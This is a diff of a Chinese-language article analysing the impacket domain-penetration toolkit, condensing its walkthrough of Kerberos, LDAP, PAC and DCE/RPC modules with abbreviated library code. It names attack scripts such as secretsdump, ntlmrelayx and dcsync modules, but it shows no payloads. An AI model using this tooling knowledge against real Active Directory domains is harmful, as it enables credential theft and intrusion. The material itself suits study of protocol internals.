@@ -41,178 +41,34 @@ impacket 是一个常用的“域渗透工具包”，其 examples 文件夹下�
 
 ```
 C:.
-│   cdp.py
-│   crypto.py
-│   dhcp.py
-│   dns.py
-│   dot11.py
-│   Dot11Crypto.py
-│   Dot11KeyManager.py
-│   dpapi.py
-│   eap.py
-│   ese.py
-│   helper.py
-│   hresult_errors.py
-│   http.py
-│   ICMP6.py
-│   ImpactDecoder.py
-│   ImpactPacket.py
-│   IP6.py
-│   IP6_Address.py
-│   IP6_Extension_Headers.py
-│   mapi_constants.py
-│   mqtt.py
-│   NDP.py
-│   nmb.py
-│   ntlm.py
-│   nt_errors.py
-│   pcapfile.py
-│   pcap_linktypes.py
-│   smb.py
-│   smb3.py
-│   smb3structs.py
-│   smbconnection.py
-│   smbserver.py
-│   spnego.py
-│   structure.py
-│   system_errors.py
-│   tds.py
-│   uuid.py
-│   version.py
-│   winregistry.py
-│   wps.py
-│   __init__.py
+│   # impacket 根目录：协议实现与基础模块
+│   cdp.py / crypto.py / dhcp.py / dns.py / dot11.py / Dot11Crypto.py
+│   dpapi.py / ese.py / http.py / nmb.py / ntlm.py / spnego.py
+│   smb.py / smb3.py / smb3structs.py / smbconnection.py / smbserver.py
+│   structure.py / system_errors.py / tds.py / uuid.py / version.py / wps.py ...
 │
 ├───dcerpc
-│   │   __init__.py
-│   │
-│   └───v5
-│       │   atsvc.py
-│       │   bkrp.py
-│       │   dcomrt.py
-│       │   dhcpm.py
-│       │   drsuapi.py
-│       │   dssp.py
-│       │   dtypes.py
-│       │   enum.py
-│       │   epm.py
-│       │   even.py
-│       │   even6.py
-│       │   iphlp.py
-│       │   lsad.py
-│       │   lsat.py
-│       │   mgmt.py
-│       │   mimilib.py
-│       │   ndr.py
-│       │   nrpc.py
-│       │   nspi.py
-│       │   oxabref.py
-│       │   par.py
-│       │   rpch.py
-│       │   rpcrt.py
-│       │   rprn.py
-│       │   rrp.py
-│       │   samr.py
-│       │   sasec.py
-│       │   scmr.py
-│       │   srvs.py
-│       │   transport.py
-│       │   tsch.py
-│       │   tsts.py
-│       │   wkst.py
-│       │   __init__.py
+│   └───v5                # 各 RPC 接口的 py 实现（第三、六部分逐个分析）
+│       │   ndr.py / rpcrt.py / dtypes.py / enum.py / transport.py / epm.py   # RPC 基础
+│       │   atsvc.py / bkrp.py / dhcpm.py / drsuapi.py / dssp.py / even6.py
+│       │   lsad.py / lsat.py / mimilib.py / nrpc.py / nspi.py / oxabref.py
+│       │   par.py / rpch.py / rprn.py / rrp.py / samr.py / srvs.py
+│       │   tsch.py / tsts.py / wkst.py / dcomrt.py ...
 │       │
-│       └───dcom
-│               comev.py
-│               oaut.py
-│               scmp.py
-│               vds.py
-│               wmi.py
-│               __init__.py
+│       └───dcom          # DCOM 子模块（第六部分）
+│               comev.py / oaut.py / scmp.py / vds.py / wmi.py
 │
-├───examples
-│   │   ldap_shell.py
-│   │   logger.py
-│   │   os_ident.py
-│   │   remcomsvc.py
-│   │   rpcdatabase.py
-│   │   secretsdump.py
-│   │   serviceinstall.py
-│   │   smbclient.py
-│   │   utils.py
-│   │   __init__.py
-│   │
-│   └───ntlmrelayx
-│       │   __init__.py
-│       │
-│       ├───attacks
-│       │   │   dcsyncattack.py
-│       │   │   httpattack.py
-│       │   │   imapattack.py
-│       │   │   ldapattack.py
-│       │   │   mssqlattack.py
-│       │   │   rpcattack.py
-│       │   │   smbattack.py
-│       │   │   __init__.py
-│       │   │
-│       │   └───httpattacks
-│       │           adcsattack.py
-│       │           __init__.py
-│       │
-│       ├───clients
-│       │       dcsyncclient.py
-│       │       httprelayclient.py
-│       │       imaprelayclient.py
-│       │       ldaprelayclient.py
-│       │       mssqlrelayclient.py
-│       │       rpcrelayclient.py
-│       │       smbrelayclient.py
-│       │       smtprelayclient.py
-│       │       __init__.py
-│       │
-│       ├───servers
-│       │   │   httprelayserver.py
-│       │   │   rawrelayserver.py
-│       │   │   smbrelayserver.py
-│       │   │   socksserver.py
-│       │   │   wcfrelayserver.py
-│       │   │   __init__.py
-│       │   │
-│       │   └───socksplugins
-│       │           http.py
-│       │           https.py
-│       │           imap.py
-│       │           imaps.py
-│       │           mssql.py
-│       │           smb.py
-│       │           smtp.py
-│       │           __init__.py
-│       │
-│       └───utils
-│               config.py
-│               enum.py
-│               ssl.py
-│               targetsutils.py
-│               tcpshell.py
-│               __init__.py
+├───examples              # 域渗透常用脚本：getTGT / getST / ticketer / secretsdump
+│   │                     # psexec / wmiexec / atexec / dcomexec / rpcmap / netview ...
+│   └───ntlmrelayx        # NTLM 中继框架（attacks / clients / servers /
+│                         #   socksplugins / utils 子目录结构略）
 │
-├───krb5
-│       asn1.py
-│       ccache.py
-│       constants.py
-│       crypto.py
-│       gssapi.py
-│       kerberosv5.py
-│       keytab.py
-│       pac.py
-│       types.py
-│       __init__.py
+├───krb5                  # Kerberos 协议实现（第四部分）
+│       asn1.py / ccache.py / constants.py / crypto.py / gssapi.py
+│       kerberosv5.py / keytab.py / pac.py / types.py
 │
-└───ldap
-        ldap.py
-        ldapasn1.py
-        ldaptypes.py
-        __init__.py
+└───ldap                  # LDAP 协议实现
+        ldap.py / ldapasn1.py / ldaptypes.py
 ```
 接下来逐步分析各模块的关键函数与方法。
 
@@ -228,58 +84,17 @@ impacket 根目录的 structure.py 定义了 Structure 基类——keytab.py、c
         where format specifies how the data in the field will be converted to/from bytes (string)
         class is the class to use when unpacking ':' fields.
 
-        each field can only contain one value (or an array of values for *)
-           i.e. struct.pack('Hl',1,2) is valid, but format specifier 'Hl' is not (you must use 2 dfferent fields)
-
-        format specifiers:
-          specifiers from module pack can be used with the same format 
-          see struct.__doc__ (pack/unpack is finally called)
-            x       [padding byte]
-            c       [character]
-            b       [signed byte]
-            B       [unsigned byte]
-            h       [signed short]
-            H       [unsigned short]
-            l       [signed long]
-            L       [unsigned long]
-            i       [signed integer]
-            I       [unsigned integer]
-            q       [signed long long (quad)]
-            Q       [unsigned long long (quad)]
-            s       [string (array of chars), must be preceded with length in format specifier, padded with zeros]
-            p       [pascal string (includes byte count), must be preceded with length in format specifier, padded with zeros]
-            f       [float]
-            d       [double]
-            =       [native byte ordering, size and alignment]
-            @       [native byte ordering, standard size and alignment]
-            !       [network byte ordering]
-            <       [little endian]
-            >       [big endian]
-
-          usual printf like specifiers can be used (if started with %) 
-          [not recommended, there is no way to unpack this]
-
-            %08x    will output an 8 bytes hex
-            %s      will output a string
-            %s\\x00  will output a NUL terminated string
-            %d%d    will output 2 decimal digits (against the very same specification of Structure)
-            ...
-
+        format specifiers:  # 与 struct 模块一致（x c b B h H l L i I q Q s p f d = @ ! < >）
           some additional format specifiers:
             :       just copy the bytes from the field into the output string (input may be string, other structure, or anything responding to __str__()) (for unpacking, all what's left is returned)
-            z       same as :, but adds a NUL byte at the end (asciiz) (for unpacking the first NUL byte is used as terminator)  [asciiz string]
-            u       same as z, but adds two NUL bytes at the end (after padding to an even size with NULs). (same for unpacking) [unicode string]
+            z       same as :, but adds a NUL byte at the end (asciiz)  [asciiz string]
+            u       same as z, but adds two NUL bytes at the end  [unicode string]
             w       DCE-RPC/NDR string (it's a macro for [  '<L=(len(field)+1)/2','"\\x00\\x00\\x00\\x00','<L=(len(field)+1)/2',':' ]
-            ?-field length of field named 'field', formatted as specified with ? ('?' may be '!H' for example). The input value overrides the real length
-            ?1*?2   array of elements. Each formatted as '?2', the number of elements in the array is stored as specified by '?1' (?1 is optional, or can also be a constant (number), for unpacking)
-            'xxxx   literal xxxx (field's value doesn't change the output. quotes must not be closed or escaped)
-            "xxxx   literal xxxx (field's value doesn't change the output. quotes must not be closed or escaped)
-            _       will not pack the field. Accepts a third argument, which is an unpack code. See _Test_UnpackCode for an example
-            ?=packcode  will evaluate packcode in the context of the structure, and pack the result as specified with ?. Unpacking is made plain
-            ?&fieldname "Address of field fieldname".
-                        For packing it will simply pack the id() of fieldname. Or use 0 if fieldname doesn't exists.
-                        For unpacking, it's used to know weather fieldname has to be unpacked or not, i.e. by adding a & field you turn another field (fieldname) in an optional field.
-            
+            ?-field length of field named 'field', formatted as specified with ?
+            ?1*?2   array of elements. Each formatted as '?2', the number of elements is stored as specified by '?1'
+            'xxxx / "xxxx   literal xxxx (field's value doesn't change the output)
+            # printf 风格（%08x、%s 等）与 _ / ?=packcode / ?&fieldname 等
+            # 更冷门的说明符此处略，完整说明见 structure.py 源码
     """
 ```
 
@@ -324,7 +139,7 @@ class Header(Structure):
 
 
 
-### ldap.py
+### ldap.py — LDAP 登录与检索（login / search）
 该文件主要实现了 LDAP、LDAPS、GC（全局编录）和 Kerberos 协议的登录函数。
 
 ```python
@@ -347,7 +162,7 @@ ldap.py 中这 3 个函数，是后续编写脚本时（无论域内还是域外
 
 这边顺便说下 GC 协议：全局编录（Global Catalog）可以通俗理解为一个跨域的缓存数据库接口。全局编录服务器是 Active Directory 域服务（AD DS）林中所有对象的集合——它是一个域控制器，存储本域目录中所有对象的完全副本，以及林中其他域对象的部分只读副本，用于响应全局编录查询。端口为 3268（LDAP）和 3269（LDAPS），扫描域控时又可以多关注两个端口了。
 
-### ldapasn1.py
+### ldapasn1.py — LDAP 请求数据结构（ASN.1）
 
 该文件主要定义了 LDAP 请求中各参数的数据结构，可以类比成 Go 编程中的 struct。
 
@@ -411,7 +226,7 @@ class Record(Sequence):
     )
 ```
 
-### ldaptypes.py
+### ldaptypes.py — ACL 安全描述符结构（ACE / DACL）
 
 该文件主要定义了 ACL 中各类安全描述符结构（ACE、DACL 等）。
 
@@ -454,7 +269,7 @@ ACE_TYPES = [
 
 ## 第 4 章 Kerberos 认证（krb5）
 
-### asn1.py
+### asn1.py — Kerberos 数据包格式（AS/TGS/AP）
 
 asn1.py 主要定义了 Kerberos 协议中各类请求 / 响应的数据包格式，如 AS_REQ、AS_REP、TGS_REQ、TGS_REP 等。
 
@@ -527,7 +342,7 @@ class TGS_REP(KDC_REP):
         ......
 ```
 
-### constants.py
+### constants.py — Kerberos 枚举常量（flag / error_code）
 
 主要包含 Kerberos 认证中涉及的各类 flag、error_code、主体类型等静态枚举变量，方便认证时调用。
 
@@ -561,7 +376,7 @@ class PrincipalNameType(Enum):
     NT_ENT_PRINCIPAL_AND_ID = -130
 ```
 
-### keytab.py
+### keytab.py — 密钥表文件解析与保存
 
 同样顾名思义，该文件包含一系列解析或保存 keytab 文件的类与函数。keytab 是保存 Principal 身份密钥的密钥表文件，用途类似 SSH 身份认证中的 id_rsa 私钥，方便通过 Kerberos 进行身份校验，一般保存在 /etc/security/keytabs/ 下（如 nn.service.keytab）。以 CDH 生成并使用 keytab 文件为例：
 
@@ -629,7 +444,7 @@ keytab文件格式如下
 
 在 keytab 类的 getData()、getKey() 函数中，可以看到对 keytab 文件中数据结构的解析和取值。
 
-### ccache.py
+### ccache.py — 凭据缓存文件解析（toTGT / toTGS）
 
 正如第 2 章 structure.py 中所见，ccache.py 是对 Kerberos 凭据二进制缓存文件（ccache）进行解析的类，包含 Credential 中的 toTGT、toTGS 等函数。先看下 ccache 缓存文件的结构：
 
@@ -637,71 +452,45 @@ keytab文件格式如下
 ccache {
           uint16_t file_format_version; /* 0x0504 */ 文件格式版本
           uint16_t headerlen;           /* only if version is 0x0504 */
-          header headers[];             /* only if version is 0x0504 */
+          header headers[];             /* 仅 0x0504 及以上版本存在 */
           principal primary_principal;
           credential credentials[*];
 };
 
-header {
-       uint16_t tag;                    /* 1 = DeltaTime */
-       uint16_t taglen;
-       uint8_t tagdata[taglen]
-};  // 仅存在于 0x0504 及以上版本
-其中最常用的tag为DeltaTime（(0x0001)），tagdata中是time_offset和usec_offset
-DeltaTime {
-       uint32_t time_offset;
-       uint32_t usec_offset;
-};
+# header 结构为「tag + taglen + tagdata」；最常用 tag 为 DeltaTime（0x0001），
+# tagdata 中是 time_offset / usec_offset，用于本机时钟与 KDC 的时间偏移校准
+
 credential {
-           principal client; 客户端数据块
-           principal server; 服务端数据块
-           keyblock key; 密钥块
-           times    time; 时间模块
-           uint8_t  is_skey;   是否是skey         /* 1 if skey, 0 otherwise */
-           uint32_t tktflags;           /* stored in reversed byte order */
-           uint32_t num_address;
-           address  addrs[num_address]; 地址模块
-           uint32_t num_authdata; 
-           authdata authdata[num_authdata]; 授权数据
+            principal client; 客户端数据块
+            principal server; 服务端数据块
+            keyblock key; 密钥块
+            times    time; 时间模块（authtime / starttime / endtime / renew_till）
+            uint8_t  is_skey;   是否是skey         /* 1 if skey, 0 otherwise */
+            uint32_t tktflags;           /* stored in reversed byte order */
+            uint32_t num_address;
+            address  addrs[num_address]; 地址模块
+            uint32_t num_authdata; 
+            authdata authdata[num_authdata]; 授权数据
             counted_octet_string ticket; 票据
             counted_octet_string second_ticket; 第二张票据，通过 DUPLICATE-SKEY 或 ENC-TKT-IN-SKEY 与票据相关
 };
 
 keyblock {
-         uint16_t keytype;加密类型
-         uint16_t etype;                /* only present if version 0x0503 */
-         uint16_t keylen;
-         uint8_t keyvalue[keylen]; 密钥key
-};
-
-times {
-      uint32_t  authtime;
-      uint32_t  starttime;
-      uint32_t  endtime;
-      uint32_t  renew_till;
-};
-
-address {
-        uint16_t addrtype;
-        counted_octet_string addrdata;
-};
-
-authdata {
-         uint16_t authtype;
-         counted_octet_string authdata;
+          uint16_t keytype;加密类型
+          uint16_t etype;                /* only present if version 0x0503 */
+          uint16_t keylen;
+          uint8_t keyvalue[keylen]; 密钥key
 };
 
 principal {
-          uint32_t name_type;           /* not present if version 0x0501 */
-          uint32_t num_components;      /* sub 1 if version 0x501 */
-          counted_octet_string realm; 域
-          counted_octet_string components[num_components]; 用户/服务名称
+           uint32_t name_type;           /* not present if version 0x0501 */
+           uint32_t num_components;      /* sub 1 if version 0x501 */
+           counted_octet_string realm; 域
+           counted_octet_string components[num_components]; 用户/服务名称
 };
 
-counted_octet_string {
-    uint32_t length;
-    uint8_t data[length];
-};
+# times / address / authdata / counted_octet_string 子结构略：
+# 均为「类型字段 + counted_octet_string（length + data）」的两段式布局
 ```
 
 第二张票据的存在初看令人费解，查了很多文档后，在 IBM 的系统编程文档中找到了它的应用场景：
@@ -770,7 +559,7 @@ def getCredential(self, server, anySPN=True):
         ccache.saveFile(self.__user + '.ccache')
 ```
 
-### types.py
+### types.py — Principal 等认证数据处理类
 
 主要是 KerberosException、Principal、Address、EncryptedData、Ticket、KerberosTime 等 Kerberos 认证中常用数据的处理类。其中最重要的是 Principal（认证主体）：它由三部分组成——primary（用户 / 服务名）、instance（服务实例名）和 realm（域名）。primary 与 instance 之间用 / 分隔，instance 与 realm 之间用 @ 分隔，如 joe/admin@EXAMPLE.COM 或 joe/node2.example.com。
 
@@ -786,25 +575,10 @@ class Principal(object):
 
 If the value contains no realm, then default_realm will be used."""
     def __init__(self, value=None, default_realm=None, type=None):
-        self.type = constants.PrincipalNameType.NT_UNKNOWN
-        self.components = []
-        self.realm = None
+        ......
 
-        if value is None:
-            return
-
-        try:               # Python 2
-            if isinstance(value, unicode):
-                value = value.encode('utf-8')
-        except NameError:  # Python 3
-            if isinstance(value, bytes):
-                value = value.decode('utf-8')
-
-        if isinstance(value, Principal):
-            self.type = value.type
-            self.components = value.components[:]
-            self.realm = value.realm
         elif isinstance(value, str):
+            # 字符串形式：正则拆出 realm（@ 之后）与各组件（/ 分隔，支持 \ 转义）
             m = re.match(r'((?:[^\\]|\\.)+?)(@((?:[^\\@]|\\.)+))?$', value)
             if not m:
                 raise KerberosException("invalid principal syntax")
@@ -821,59 +595,11 @@ If the value contains no realm, then default_realm will be used."""
                 unquote_component(qc)
                 for qc in re.findall(r'(?:[^\\/]|\\.)+', m.group(1))]
         elif len(value) == 2:
-            self.components = value[0]
-            self.realm = value[-1]
-            if isinstance(self.components, str):
-                self.components = [self.components]
-        elif len(value) >= 2:
-            self.components = value[0:-1]
-            self.realm = value[-1]
-        else:
-            raise KerberosException("invalid principal value")
+            ......
 
-        if type is not None:
-            self.type = type
-
-    def __eq__(self, other):
-        if isinstance (other, str):
-            other = Principal (other)
-
-        return (self.type == constants.PrincipalNameType.NT_UNKNOWN.value or
-                other.type == constants.PrincipalNameType.NT_UNKNOWN.value or
-                self.type == other.type) and all (map (lambda a, b: a == b, self.components, other.components)) and \
-               self.realm == other.realm
-
-    def __str__(self):
-        def quote_component(comp):
-            return re.sub(r'([\\/@])', r'\\\1', comp)
-
-        ret = "/".join([quote_component(c) for c in self.components])
-        if self.realm is not None:
-            ret += "@" + self.realm
-
-        return ret
-
-    def __repr__(self):
-        return "Principal((" + repr(self.components) + ", " + \
-               repr(self.realm) + "), t=" + str(self.type) + ")"
-
-    def from_asn1(self, data, realm_component, name_component):
-        name = data.getComponentByName(name_component)
-        self.type = constants.PrincipalNameType(
-            name.getComponentByName('name-type')).value
-        self.components = [
-            str(c) for c in name.getComponentByName('name-string')]
-        self.realm = str(data.getComponentByName(realm_component))
-        return self
-
-    def components_to_asn1(self, name):
-        name.setComponentByName('name-type', int(self.type))
-        strings = name.setComponentByName('name-string'
-                                          ).getComponentByName('name-string')
-        for i, c in enumerate(self.components):
-            strings.setComponentByPosition(i, c)
-
-        return name
+    # __eq__ / __str__ / __repr__ 等方法略。
+    # from_asn1 与 components_to_asn1 负责 Principal 与 asn1 结构的互转，
+    # 在 getKerberosTGT / getKerberosTGS 中大量使用（见本章 kerberosv5.py 一节）
 ```
 
 在getST中我们可以看到对Principal的赋值
@@ -882,7 +608,7 @@ If the value contains no realm, then default_realm will be used."""
 principal = ccache.credentials[0].header['server'].prettyPrint()
 ```
 
-### crypto.py
+### crypto.py — Kerberos 加密类型实现（RC4 / AES）
 
 实现了 Kerberos 各加密类型（RC4-HMAC、AES128/256-CTS-HMAC-SHA1 等）的加解密与密钥推导（string_to_key）函数，MD4 / MD5 等算法用于支撑 RC4 等加密类型。
 
@@ -906,7 +632,7 @@ from impacket import nmb, ntlm, uuid, crypto
                 signature = crypto.AES_CMAC(self._Session['SigningKey'], p, len(p))
 ```
 
-### gssapi.py
+### gssapi.py — GSS-API 封装（MIC / WRAP）
 
 GSSAPI 是 RFC 2743 中定义的安全认证工业标准接口，常用于服务的 Kerberos 认证，如 MongoDB、PostgreSQL、FTP 等。这里需要理解 GSSAPI 与 Kerberos 认证协议的区别：GSSAPI 的全称是[Generic Security Services Application Program Interface](https://en.wikipedia.org/wiki/Generic_Security_Services_Application_Program_Interface)（通用安全服务应用程序接口）。可以看出，GSS-API 是一个 API 规范，是实现 Kerberos 协议时定义的编程接口。
 
@@ -1070,7 +796,7 @@ from impacket.spnego import SPNEGO_NegTokenResp
             return None, STATUS_ACCESS_DENIED
 ```
 
-### kerberosv5.py
+### kerberosv5.py — getKerberosTGT / getKerberosTGS 认证流程
 
 文件中最重要的函数是 Kerberos 认证流程中的 getKerberosTGT 与 getKerberosTGS。
 
@@ -1294,7 +1020,7 @@ KDC 收到内容 1（TGT）与内容 2（session key 加密的 Authenticator）�
         ccache.saveFile(self.__saveFileName + '.ccache')
 ```
 
-### pac.py
+### pac.py — 特权属性证书 PAC 结构与解析
 
 特权属性证书（PAC）由完成身份验证的协议使用，用于传输授权信息、控制对资源的访问。Kerberos 协议 [RFC4120] 本身不提供授权，创建 PAC 正是为了给 Kerberos 协议扩展 [MS-KILE] 补充这部分授权数据。PAC 结构按 [MS-KILE] 对授权信息编码，包括组成员身份、附加凭证信息、配置文件与策略信息以及支持的安全元数据。
 
@@ -1371,6 +1097,7 @@ class VALIDATION_INFO(TypeSerialization1):
 class S4U2SELF:
 
     def printPac(self, data):
+        # ① 解开票据 enc-part，经 AD_IF_RELEVANT 取出 PAC
         encTicketPart = decoder.decode(data, asn1Spec=EncTicketPart())[0]
         adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[
             0]
@@ -1378,48 +1105,33 @@ class S4U2SELF:
         pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
         buff = pacType['Buffers']
 
+        # ② 遍历 PAC_INFO_BUFFER，按 ulType 分发解析
         for bufferN in range(pacType['cBuffers']):
             infoBuffer = PAC_INFO_BUFFER(buff)
             data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
             if logging.getLogger().level == logging.DEBUG:
                 print("TYPE 0x%x" % infoBuffer['ulType'])
             if infoBuffer['ulType'] == 1:
+                # ③ 登录信息（KERB_VALIDATION_INFO）：跳过 4 字节指针 ReferentID 后解析 NDR 结构
                 type1 = TypeSerialization1(data)
-                # I'm skipping here 4 bytes with its the ReferentID for the pointer
                 newdata = data[len(type1)+4:]
                 kerbdata = KERB_VALIDATION_INFO()
                 kerbdata.fromString(newdata)
                 kerbdata.fromStringReferents(newdata[len(kerbdata.getData()):])
                 kerbdata.dump()
-                print()
                 print('Domain SID:', kerbdata['LogonDomainId'].formatCanonical())
-                print()
+            # 其余类型（CLIENT_INFO / SERVER_CHECKSUM / PRIVSVR_CHECKSUM / UPN_DNS_INFO）
+            # 仅在 DEBUG 模式 dump，结构与上面同构，略
             elif infoBuffer['ulType'] == PAC_CLIENT_INFO_TYPE:
-                clientInfo = PAC_CLIENT_INFO(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    clientInfo.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_SERVER_CHECKSUM:
-                signatureData = PAC_SIGNATURE_DATA(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    signatureData.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_PRIVSVR_CHECKSUM:
-                signatureData = PAC_SIGNATURE_DATA(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    signatureData.dump()
-                    print()
+                ......
             elif infoBuffer['ulType'] == PAC_UPN_DNS_INFO:
-                upn = UPN_DNS_INFO(data)
-                if logging.getLogger().level == logging.DEBUG:
-                    upn.dump()
-                    print(data[upn['DnsDomainNameOffset']:])
-                    print()
+                ......
             else:
                 hexdump(data)
-
-            if logging.getLogger().level == logging.DEBUG:
-                print("#"*80)
 
             buff = buff[len(infoBuffer):]
 ```
@@ -1428,7 +1140,7 @@ class S4U2SELF:
 
 ## 第 5 章 DCE/RPC 接口（dcerpc）
 
-### RPC 编程基础
+### RPC 编程基础 — MIDL / stub / 运行时库
 
 首先我们看一下 RPC 的实现过程。
 
@@ -1495,7 +1207,7 @@ interface INTERFACENAME
 
 完整的 RPC 编程入门示例可参考：https://developer.aliyun.com/article/258886
 
-### ndr.py
+### ndr.py — NDR 数据表示与序列化
 
 微软使用 NDR（Network Data Representation）引擎来封送（marshaling，类似序列化 / 反序列化）RPC 和 DCOM 通信时客户端与服务端 stub 之间的数据。IDL 的一个作用是提供描述这些结构化数据类型和值的语法。但是，RPC 协议指定输入和输出以八位字节流的形式传递，NDR 的作用是提供 IDL 数据类型到八位字节流的映射。NDR 在八位字节流中定义了原始数据类型、构造数据类型和这些类型的表示。
 
@@ -1539,13 +1251,13 @@ class NETLOGON_SECURE_CHANNEL_TYPE(NDRENUM):
 
 对 NDR 结构化数据感兴趣的读者可参阅此文档：https://pubs.opengroup.org/onlinepubs/9629399/chap14.htm
 
-### [MS-DTYP]dtypes.py
+### [MS-DTYP] dtypes.py — RPC 基础数据类型（DWORD / BOOL）
 
 主要定义了协议通信中的各个基础数据类型，如DWORD，BOOL等等，具体类型数据可查看文档
 
 https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/cca27429-5689-4a16-b2b4-9325d93e4ba2
 
-### [MS-RPCE]rpcrt.py
+### [MS-RPCE] rpcrt.py — DCERPC 运行时核心（header / bind / DCERPC 类）
 
 主要是dcerpc通信中涉及的静态变量和tag参数、header等数据结构
 
@@ -1601,7 +1313,7 @@ class WKSTServer(DCERPCServer):
         self.addCallbacks(('6BFFD098-A112-3610-9833-46C3F87E345A', '1.0'), '\\PIPE\\wkssvc', self.wkssvcCallBacks)
 ```
 
-### enum.py
+### enum.py — Python 枚举基类（NDRENUM 基础）
 
 Python 枚举基类模块，NDR 中的 NDRENUM 等枚举类型都基于它实现。
 
@@ -1609,7 +1321,7 @@ Python 枚举基类模块，NDR 中的 NDRENUM 等枚举类型都基于它实现
 
 以上就是 impacket 中 MSRPC 通信的基础模块，后面开始介绍各个 RPC 接口对应的 py 模块。
 
-### [MS-RPC-EPM]epm.py
+### [MS-RPC-EPM] epm.py — 端点映射器（hept_map 端点解析）
 
 ```
 Microsoft 远程过程调用 (RPC) 端点映射器 (EPM) 协议。这是基于 TCP/UDP 端口的服务，包括 TCP/UDP 端口 135。此表中的所有其他服务/组都是基于 UUID 的。
@@ -1620,6 +1332,7 @@ Microsoft 远程过程调用 (RPC) 端点映射器 (EPM) 协议。这是基于 T
 ```python
 def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')), protocol = 'ncacn_np', dce=None):
 
+    # ① 没有现成 dce 连接时，先绑定目标 135 端口的 EPM 接口
     if dce is None:
         stringBinding = r'ncacn_ip_tcp:%s[135]' % destHost
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
@@ -1629,24 +1342,24 @@ def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-
     else:
         disconnect = False
 
-
     dce.bind(MSRPC_UUID_PORTMAP)
 
+    # ② 组装 EPMTower（端点塔）：接口层 + NDR 数据表示层 + 协议标识层 + 传输层
     tower = EPMTower()
     interface = EPMRPCInterface()
-
     interface['InterfaceUUID'] = remoteIf[:16]
     interface['MajorVersion'] = unpack('<H', remoteIf[16:][:2])[0]
     interface['MinorVersion'] = unpack('<H', remoteIf[18:])[0]
 
     dataRep = EPMRPCDataRepresentation()
     dataRep['DataRepUuid'] = dataRepresentation[:16]
-    dataRep['MajorVersion'] = unpack('<H', dataRepresentation[16:][:2])[0]
-    dataRep['MinorVersion'] = unpack('<H', dataRepresentation[18:])[0]
+    ......
 
     protId = EPMProtocolIdentifier()
     protId['ProtIdentifier'] = FLOOR_RPCV5_IDENTIFIER
 
+    # ③ 传输层 floor 按目标协议构造（ncacn_np 为管道名+主机名，
+    #    ncacn_ip_tcp / ncacn_http 为端口+地址，结构相同，此处略）
     if protocol == 'ncacn_np':
         pipeName = EPMPipeName()
         pipeName['PipeName'] = b'\x00'
@@ -1654,78 +1367,37 @@ def hept_map(destHost, remoteIf, dataRepresentation = uuidtup_to_bin(('8a885d04-
         hostName = EPMHostName()
         hostName['HostName'] = b('%s\x00' % destHost)
         transportData = pipeName.getData() + hostName.getData()
-
-    elif protocol == 'ncacn_ip_tcp':
-        portAddr = EPMPortAddr()
-        portAddr['IpPort'] = 0
-
-        hostAddr = EPMHostAddr()
-        import socket
-        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
-        transportData = portAddr.getData() + hostAddr.getData()
-    elif protocol == 'ncacn_http':
-        portAddr = EPMPortAddr()
-        portAddr['PortIdentifier'] = FLOOR_HTTP_IDENTIFIER
-        portAddr['IpPort'] = 0
-
-        hostAddr = EPMHostAddr()
-        import socket
-        hostAddr['Ip4addr'] = socket.inet_aton('0.0.0.0')
-        transportData = portAddr.getData() + hostAddr.getData()
-
-    else:
-        LOG.error('%s not support for hetp_map()' % protocol)
-        if disconnect is True:
-            dce.disconnect()
-        return None
+    elif protocol in ('ncacn_ip_tcp', 'ncacn_http'):
+        ......
 
     tower['NumberOfFloors'] = 5
     tower['Floors'] = interface.getData() + dataRep.getData() + protId.getData() + transportData
 
+    # ④ 发送 ept_map 请求（Windows 2003 上 Referent ID 必须固定为 1/2）
     request = ept_map()
     request['max_towers'] = 1
     request['map_tower']['tower_length'] = len(tower)
     request['map_tower']['tower_octet_string'] = tower.getData()
-
-    # Under Windows 2003 the Referent IDs cannot be random
-    # they must have the following specific values
-    # otherwise we get a rpc_x_bad_stub_data exception
     request.fields['obj'].fields['ReferentID'] = 1
     request.fields['map_tower'].fields['ReferentID'] = 2
 
     resp = dce.request(request)
 
+    # ⑤ 从返回的 tower 第 4 层解析出端点字符串绑定并返回
     tower = EPMTower(b''.join(resp['ITowers'][0]['Data']['tower_octet_string']))
-    # Now let's parse the result and return an stringBinding
-    result = None
     if protocol == 'ncacn_np':
-        # Pipe Name should be the 4th floor
-        pipeName = EPMPipeName(tower['Floors'][3].getData())
+        pipeName = EPMPipeName(tower['Floors'][3].getData())         # 管道名在第 4 层
         result = 'ncacn_np:%s[%s]' % (destHost, pipeName['PipeName'].decode('utf-8')[:-1])
-    elif protocol == 'ncacn_ip_tcp':
-        # Port Number should be the 4th floor
-        portAddr = EPMPortAddr(tower['Floors'][3].getData())
-        result = 'ncacn_ip_tcp:%s[%s]' % (destHost, portAddr['IpPort'])
-    elif protocol == 'ncacn_http':
-        # Port Number should be the 4th floor
-        portAddr = EPMPortAddr(tower['Floors'][3].getData())
-        result = 'ncacn_http:%s[%s]' % (destHost, portAddr['IpPort'])
+    elif protocol in ('ncacn_ip_tcp', 'ncacn_http'):
+        portAddr = EPMPortAddr(tower['Floors'][3].getData())          # 端口号在第 4 层
+        ......
+
     if disconnect is True:
         dce.disconnect()
     return result
-
-
-# eg./examples/ntlmrelayx/clients/rpcrelayclient.py
-
-from impacket.dcerpc.v5 import transport, rpcrt, epm, tsch
-from impacket.dcerpc.v5.ndr import NDRCALL
-from impacket.dcerpc.v5.rpcrt import DCERPC_v5, MSRPCBind, CtxItem, MSRPCHeader, SEC_TRAILER, MSRPCBindAck, \
-            LOG.debug("Connecting to ncacn_ip_tcp:%s[135] to determine %s stringbinding" % (target.netloc, self.endpoint))
-            self.stringbinding = epm.hept_map(target.netloc, self.endpoint_uuid, protocol='ncacn_ip_tcp')
-    	......
 ```
 
-### transport.py
+### transport.py — RPC 传输层（TCP / UDP / HTTP / SMB）
 
